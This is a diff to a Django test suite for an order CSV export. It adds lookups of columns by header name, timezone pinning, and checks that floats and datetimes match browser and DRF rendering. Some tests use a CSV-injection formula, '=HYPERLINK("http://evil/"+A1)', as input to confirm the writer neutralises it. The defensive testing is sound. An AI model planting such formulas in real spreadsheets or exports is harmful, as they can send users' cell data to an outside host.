@@ -21,7 +21,8 @@ deliberately not a dependency.
 import csv
 import io
 import json
-from datetime import datetime
+from datetime import datetime, timedelta
+from datetime import timezone as dt_timezone
 from decimal import Decimal
 from uuid import uuid4
 
@@ -30,8 +31,9 @@ from django.contrib.auth.models import User
 from django.core.management import call_command
 from django.db import transaction
 from django.test.runner import DiscoverRunner
-from django.test.utils import setup_test_environment, teardown_test_environment
+from django.test.utils import override_settings, setup_test_environment, teardown_test_environment
 from django.urls import reverse
+from django.utils import timezone
 from rest_framework.test import APIClient
 
 from shop.csv_export import ORDER_EXPORT_HEADER, csv_cell, csv_text
@@ -102,9 +104,34 @@ def export_url():
     return reverse("order-export")
 
 
+def col(name):
+    """Column index BY HEADER NAME.
+
+    The parent block grew the FR-R005 `weight` column, which silently re-pointed
+    every hand-written index at its neighbour — a literal `7` cannot fail when
+    the column it named moved one seat right, so the cell tests look names up.
+    """
+    return ORDER_EXPORT_HEADER.index(name)
+
+
 def read_csv(body: str):
     """Parse a document back with the stdlib reader — the round trip is the test."""
     return list(csv.reader(io.StringIO(body)))
+
+
+@pytest.fixture
+def utc_project_timezone():
+    """Pin the timezone context the literal expectations are written in.
+
+    DRF renders every datetime in the PROJECT timezone and this writer mirrors
+    DRF, so a literal like "2026-10-20T21:00:00Z" is only true under
+    TIME_ZONE="UTC" — which the shipped rig declares (core/settings.py:76) but
+    conftest.py never sets, leaving Django's own default (America/Chicago). Under
+    that default the shared golden document fails on the machine rather than on
+    the code, so the pin is explicit wherever a literal is asserted.
+    """
+    with override_settings(TIME_ZONE="UTC"):
+        yield
 
 
 # ---------------------------------------------------------------------------
@@ -216,31 +243,37 @@ class TestCsvWriterParity:
         assert not expected.startswith("'")
         assert csv_cell(value) == expected
 
+    @pytest.mark.usefixtures("utc_project_timezone")
     def test_the_shared_golden_document(self):
         """One document, asserted twice: here and in csv.test.ts.
 
         Values were chosen to force every quoting/guard branch at once (int,
         padded-free text, comma text, embedded quote, embedded newline, bool,
         NULL, positive and negative Decimal, numeric-shaped STRING, formula
-        payload, datetime as object and as text, and three floats whose Python
-        `str()` forms are NOT what a browser writes for the same JSON number).
-        The literal below was produced by this writer and is reproduced byte
-        for byte by buildCsv(); if either side drifts, exactly one of the two
-        suites goes red and names the layer.
+        payload, an AWARE datetime and the same instant as TEXT, and three floats
+        whose Python `str()` forms are NOT what a browser writes for the same
+        JSON number). The `when` column is deliberately doubled — one row a
+        datetime object, one row the string a browser actually receives — because
+        a golden document whose datetime cell is text on BOTH sides cannot see the
+        rendering rule at all (that blind spot is divergence #2, see
+        TestDatetimeOverTheWire). The literal below was produced by this writer
+        and is reproduced byte for byte by buildCsv(); if either side drifts,
+        exactly one of the two suites goes red and names the layer.
         """
         header = ["id", "name", "notes", "active", "total", "when", "weight"]
         rows = [
-            [1, "Widget", "plain", True, Decimal("19.99"), datetime(2026, 10, 20, 21, 0), 1.0],
+            [1, "Widget", "plain", True, Decimal("19.99"),
+             datetime(2026, 10, 20, 21, 0, tzinfo=dt_timezone.utc), 1.0],
             [2, "Gizmo, big", 'say "hi"', False, Decimal("-5.00"), None, -0.5],
             [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', True, "-7.25",
-             "2026-10-20T21:00:00", 1e-7],
+             "2026-10-20T21:00:00Z", 1e-7],
         ]
         assert csv_text([header] + [[csv_cell(v) for v in row] for row in rows]) == (
             "id,name,notes,active,total,when,weight\r\n"
-            "1,Widget,plain,true,19.99,2026-10-20T21:00:00,1\r\n"
+            "1,Widget,plain,true,19.99,2026-10-20T21:00:00Z,1\r\n"
             '2,"Gizmo, big","say ""hi""",false,-5.00,,-0.5\r\n'
             "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\","
-            "true,-7.25,2026-10-20T21:00:00,1e-7\r\n"
+            "true,-7.25,2026-10-20T21:00:00Z,1e-7\r\n"
         )
 
 
@@ -310,11 +343,14 @@ class TestExportEndpointBasics:
         assert rows[0] == ORDER_EXPORT_HEADER
 
     def test_parent_columns_come_first_then_child(self, auth_api, db):
-        assert ORDER_EXPORT_HEADER[:9] == [
+        assert ORDER_EXPORT_HEADER[:10] == [
             "order_id", "customer_id", "customer", "product_id", "product",
-            "status", "total", "notes", "created_at",
+            "status", "total", "weight", "notes", "created_at",
         ]
         assert ORDER_EXPORT_HEADER[-5] == "history_id", "child block starts after the parent"
+        # FR-R005: the float witness column sits inside the PARENT block, next to
+        # the decimal it must not be confused with — both layers carry it.
+        assert "weight" in ORDER_EXPORT_HEADER[:10]
 
 
 class TestLineLevelShape:
@@ -326,18 +362,18 @@ class TestLineLevelShape:
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
         mine = [r for r in rows[1:] if r and r[0] == str(order.pk)]
         assert len(mine) == 2
-        assert mine[0][:9] == mine[1][:9], "parent block must repeat verbatim"
+        assert mine[0][: col("history_id")] == mine[1][: col("history_id")], "parent block must repeat verbatim"
         # creation entry first, then the move: child order is replay order, not
         # insertion order of the join
-        assert [r[10] for r in mine] == ["", "pending"]
-        assert [r[11] for r in mine] == ["pending", "paid"]
-        assert [r[12] for r in mine] == ["exp1", "exp1"], "history_actor is column 12"
+        assert [r[col("from_status")] for r in mine] == ["", "pending"]
+        assert [r[col("to_status")] for r in mine] == ["pending", "paid"]
+        assert [r[col("history_actor")] for r in mine] == ["exp1", "exp1"]
 
     def test_an_order_with_no_history_still_gets_a_row(self, auth_api, order):
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
         mine = [r for r in rows[1:] if r and r[0] == str(order.pk)]
         assert len(mine) == 1
-        assert mine[0][9:] == ["", "", "", "", ""], "empty child columns, never a dropped record"
+        assert mine[0][col("history_id"):] == ["", "", "", "", ""], "empty child columns, never a dropped record"
 
     def test_stable_order_is_primary_key_order(self, auth_api, db):
         ids = [make_order(notes=f"n{i}").pk for i in range(3)]
@@ -359,7 +395,7 @@ class TestCollectionScope:
         rows = read_csv(auth_api.get(export_url(), {"search": "alpha-unique"}).content.decode("utf-8-sig"))
         body = [r for r in rows[1:] if r]
         assert len(body) == 1
-        assert body[0][7] == "alpha-unique"
+        assert body[0][col("notes")] == "alpha-unique"
 
     def test_export_body_carries_no_pagination_wrapper(self, auth_api, db):
         make_order()
@@ -372,30 +408,199 @@ class TestCellFidelity:
         order.notes = 'gift, please\nwrap "nicely"'
         order.save(update_fields=["notes"])
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
-        cell = [r for r in rows[1:] if r and r[0] == str(order.pk)][0][7]
+        cell = [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("notes")]
         assert cell == 'gift, please\nwrap "nicely"'
 
     def test_decimal_total_is_not_reflowed_through_float(self, auth_api, order):
         order.total = Decimal("19.99")
         order.save(update_fields=["total"])
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
-        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][6] == "19.99"
+        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("total")] == "19.99"
 
     def test_a_formula_looking_note_is_neutralised(self, auth_api, order):
         order.notes = "=HYPERLINK(\"http://evil/\"+A1)"
         order.save(update_fields=["notes"])
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
-        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][7].startswith("'=")
+        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("notes")].startswith("'=")
 
     def test_null_created_at_is_an_empty_field(self, auth_api, order):
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
-        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][8] == ""
+        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("created_at")] == ""
 
     def test_long_notes_are_never_truncated(self, auth_api, order):
         order.notes = "x" * 300
         order.save(update_fields=["notes"])
         rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
-        assert len([r for r in rows[1:] if r and r[0] == str(order.pk)][0][7]) == 300
+        assert len([r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("notes")]) == 300
+
+    def test_a_null_float_is_empty_not_zero(self, auth_api, order):
+        """NULL weight -> empty field, never "0" or "None" (the null rule
+        applies to a float exactly as it does to a date)."""
+        order.weight = None
+        order.save(update_fields=["weight"])
+        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
+        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][col("weight")] == ""
+
+
+# ---------------------------------------------------------------------------
+# 2b. the float, over the wire — the FR-R005 parity proven through the model
+# field and the real endpoint rather than through the writer alone. Nothing
+# before this class proved a float ever REACHES csv_cell() as a float, which is
+# precisely the condition that makes the two export layers differ.
+#
+# Derived from the writer's own FLOAT_PARITY table (one source of truth, per
+# docs/csv-export.md §2), narrowed to the values the seeded rig actually holds
+# and which hit each rendering switch point once: integral, plain fraction,
+# exponent switch, long-form switch, negative sub-unit (the guard trap).
+# ---------------------------------------------------------------------------
+
+WIRE_VALUES = [
+    pair for pair in TestCsvWriterParity.FLOAT_PARITY
+    if pair[0] in {1.0, 19.99, 1e-7, 1e17, -0.00042}
+]
+
+
+class TestFloatOverTheWire:
+    @pytest.mark.parametrize("value,expected", WIRE_VALUES)
+    def test_exported_float_matches_the_browser_rendering(
+        self, auth_api, db, value, expected
+    ):
+        """Store -> GET export: one float, byte-identical to ``String()``.
+
+        The value reaches the file through the model field, so this asserts the
+        chain the writer-only table above cannot see: the DB stores the double,
+        ``order_export_rows`` reads it as a ``float`` (not a str, not a Decimal),
+        and the writer emits the ECMAScript form.
+        """
+        order = make_order(weight=value)
+        body = auth_api.get(export_url()).content.decode("utf-8-sig")
+        cell = [r for r in read_csv(body)[1:] if r and r[0] == str(order.pk)][0][col("weight")]
+        assert cell == expected
+        assert not cell.startswith("'"), "a number never carries the formula guard"
+
+    @pytest.mark.parametrize("value", [1.0, 1e-7, 1e17])
+    def test_the_python_repr_is_the_string_that_used_to_diverge(self, value):
+        """Counter-example, kept honest: on these three values Python's own
+        ``str()`` is NOT what the browser writes, so a writer that regressed to
+        ``str()`` would fail the test above rather than pass it by luck."""
+        expected = dict(WIRE_VALUES)[value]
+        assert str(value) != expected
+
+    def test_the_wire_subset_still_covers_every_switch_point(self):
+        """If FLOAT_PARITY is ever edited so a switch point disappears, the
+        filter above silently shrinks this class instead of failing — so the
+        coverage is asserted, not assumed."""
+        assert len(WIRE_VALUES) == 5, [text for _, text in WIRE_VALUES]
+
+    def test_json_body_carries_the_float_as_a_number_not_a_string(self, auth_api, db):
+        """The premise of the whole FR-R005 float rule, measured live.
+
+        Layer 1 can only disagree with layer 2 because JSONRenderer sends a
+        FloatField as a JSON NUMBER while a DecimalField arrives as a STRING:
+        the browser parses one and quotes the other. If a future change made
+        floats strings, the client's `typeof value === "string"` guard would be
+        dead code and this test says so before the two layers quietly re-split.
+        """
+        order = make_order(weight=1.0)
+        order.total = Decimal("19.99")
+        order.save(update_fields=["total"])
+        response = auth_api.get("/api/orders/", HTTP_ACCEPT="application/json")
+        assert response.status_code == 200
+        row = next(r for r in json.loads(response.content)["results"] if r["id"] == order.pk)
+        assert isinstance(row["weight"], float), "a float crosses the wire as a number"
+        assert isinstance(row["total"], str), "a decimal crosses the wire as a string"
+
+    def test_the_serializer_round_trip_keeps_the_double(self, auth_api, db):
+        """POST /api/orders/ with a float body -> the stored value re-renders
+        as the same double, so the parity is about presentation only."""
+        cat = Category.objects.create(name=f"cat-{uuid4().hex[:8]}")
+        product = Product.objects.create(category=cat, name="P", price=Decimal("1.00"), stock=1)
+        customer = Customer.objects.create(name="C", email=f"{uuid4().hex[:8]}@example.com")
+        response = auth_api.post(
+            "/api/orders/",
+            {"customer": customer.pk, "product": product.pk, "total": "1.00", "weight": 0.1 + 0.2},
+            format="json",
+        )
+        assert response.status_code == 201, response.content[:200]
+        created = response.json()
+        assert created["weight"] == 0.1 + 0.2
+        body = auth_api.get(export_url()).content.decode("utf-8-sig")
+        cell = [r for r in read_csv(body)[1:] if r and r[0] == str(created["id"])][0][col("weight")]
+        assert cell == "0.30000000000000004", "shortest round trip, both sides"
+
+
+# ---------------------------------------------------------------------------
+# 2c. the SECOND divergence the live rig surfaced (segment 2026-10-21, the
+# cross-twin diff over seeded rows). It is not about floats and the writer-only
+# parity table structurally could not see it: the `when` cell in the golden
+# document is a STRING on the JS side — because a browser can only ever receive
+# text — while the Python side handed csv_cell a datetime OBJECT. Both twins
+# passed the text through and the table stayed green while every real row
+# differed. Layer 1 writes DRF's ISO form; DRF spells UTC "Z", and
+# datetime.isoformat() spells it "+00:00".
+# ---------------------------------------------------------------------------
+
+@pytest.mark.usefixtures("utc_project_timezone")
+class TestDatetimeOverTheWire:
+    # (value handed to csv_cell, exact text DRF's own JSON body carries for it).
+    # That text is a function of the PROJECT timezone — DRF renders every
+    # datetime in it — so the table runs under the setting the shipped rig
+    # declares (core/settings.py:76 TIME_ZONE="UTC") rather than whatever the
+    # test environment carries: conftest.py sets no TIME_ZONE and Django's own
+    # default is America/Chicago, which rendered these rows "-05:00" and looked
+    # like a writer bug instead of a pin missing.
+    ISO_PARITY = [
+        (datetime(2026, 10, 20, 21, 0, tzinfo=dt_timezone.utc), "2026-10-20T21:00:00Z"),
+        (datetime(2026, 10, 20, 21, 0, 5, 123456, tzinfo=dt_timezone.utc),
+         "2026-10-20T21:00:05.123456Z"),
+        # an aware non-UTC value: DRF renders it in the project timezone
+        # (TIME_ZONE="UTC" here) — the same instant, UTC bytes.
+        (datetime(2026, 10, 20, 21, 0, tzinfo=dt_timezone(timedelta(hours=6))),
+         "2026-10-20T15:00:00Z"),
+        # a naive value: DRF makes it aware in the project timezone first.
+        (datetime(2026, 10, 20, 21, 0), "2026-10-20T21:00:00Z"),
+        # a DATE is not a DATETIME — no time part, no offset to re-spell.
+        (datetime(2026, 10, 20).date(), "2026-10-20"),
+    ]
+
+    @pytest.mark.parametrize("value,expected", ISO_PARITY)
+    def test_datetime_is_rendered_the_way_drf_renders_it(self, value, expected):
+        assert csv_cell(value) == expected
+
+    @pytest.mark.parametrize("project_tz", ["UTC", "America/Chicago"])
+    def test_the_csv_cell_equals_the_json_body_for_the_same_record(
+        self, auth_api, db, user, project_tz
+    ):
+        """The rule behind the table, over the wire: for one record the datetime
+        text in the CSV must be the text the SAME API put in its JSON body — byte
+        for byte, neither layer re-spelling the other's value — in ANY project
+        timezone. Run twice on purpose: pinning UTC would have proved the very
+        claim it makes, and the offset form is where a UTC-only test is blind."""
+        order = make_order(created_at=timezone.now())
+        OrderHistory.objects.create(order=order, from_status="", to_status="pending", actor=user)
+        with override_settings(TIME_ZONE=project_tz):
+            json_row = next(
+                r for r in json.loads(
+                    auth_api.get("/api/orders/", HTTP_ACCEPT="application/json").content
+                )["results"] if r["id"] == order.pk
+            )
+            trail = json.loads(
+                auth_api.get(
+                    f"/api/orders/{order.pk}/history/", HTTP_ACCEPT="application/json"
+                ).content
+            )
+            row = [
+                r for r in read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))[1:]
+                if r and r[0] == str(order.pk)
+            ][0]
+        assert row[col("created_at")] == json_row["created_at"]
+        assert row[col("history_created_at")] == trail[0]["created_at"]
+        assert row[col("created_at")] != order.created_at.isoformat(), (
+            "the writer emitted DRF's text, not the model value's own isoform — "
+            "the re-spelling that made every datetime column of a real export differ"
+        )
+        if project_tz == "UTC":
+            assert row[col("created_at")].endswith("Z")
 
 
 class TestSchemaContract:
